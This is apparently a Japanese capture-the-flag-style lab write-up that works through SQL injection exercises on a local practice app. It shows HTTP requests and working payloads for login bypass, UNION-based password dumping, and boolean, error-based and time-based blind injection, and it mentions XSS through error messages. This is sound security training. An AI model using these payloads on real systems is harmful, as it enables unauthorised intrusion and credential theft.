# SQL Injection

## Login
適当なログインIDとパスワードを入れる。当然ログインできない。
```http
POST /lab/sql-injection/post-login/ HTTP/1.1
Host: localhost:1337
Content-Length: 28

username=admin&password=pass
```

パスワードにOR文を加えてみるとログイン成功し、LeBron Jamesさんの画面が出てくる。
```http
POST /lab/sql-injection/post-login/ HTTP/1.1
Host: localhost:1337
Content-Length: 39

username=admin&password=pass'OR'1'%3d'1
```

## Find the Passwords
検索フォームの内容に応じてID,Username,E-Mail,Name,Surnameが一覧表示される。

検索欄に`'and'1'='1'# `を入れた場合に全件表示される。  
`'and'1'='2'# `だと1件も出てこない。スペルミスした`'axd'1'='1'# `だと１件も出てこない。  
このためSQLインジェクションの脆弱性がある状態だとわかる。

`1' union select id,username,password,id,id,id from users# `と入れてみると、
E-Mail欄にパスワードが表示される。
```http
GET /lab/sql-injection/find-password/?search=1%27+union+select+id%2Cusername%2Cpassword%2Cid%2Cid%2Cid+from+users%23+ HTTP/1.1
Host: localhost:1337

```

## Boolean-Based Blind SQL Injection
プルダウンから選んだ商品の在庫有無が表示される。
```http
POST /lab/sql-injection/post-blind-boolean/ HTTP/1.1
Host: localhost:1337
Content-Length: 15

search=iphone11
```
iPhone11の在庫はあるらしく、レスポンスに`We have this product in stock.`と表示される。

`search=iphone11'and'1'='1'#`でも在庫あり表示だが、
`search=iphone11'axd'1'='1'#`だと`Product sold out.`になるためandとaxdが解釈されていると判断できる。

また、`search=iphone11'and+sleep(2)=sleep(2)#`にすることでsleepが効いていることもわかる。

## Error-Based Blind SQL Injection

Nextを押すごとに`img=`のところに異なる数字が入る。

`img='`とするとエラーメッセージが表示され、MariaDBを使っていることや構文エラーであることが分かる。
> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1

`img=''`とするとエラーメッセージが出ないことから、SQLに干渉していることが明らか。

sleep(5)なども当然効くし、エラーメッセージに入力値が表示されることを利用するとXSSもできる。

## Time-Based Blind SQL Injection
タイトルがヒントでもあるので、最初からTime-Basedを狙う。

`email=hoehoe'%2b(select*from(select(sleep(3)))a)%2b'`とすることで、待ち時間が発生することが分かる。
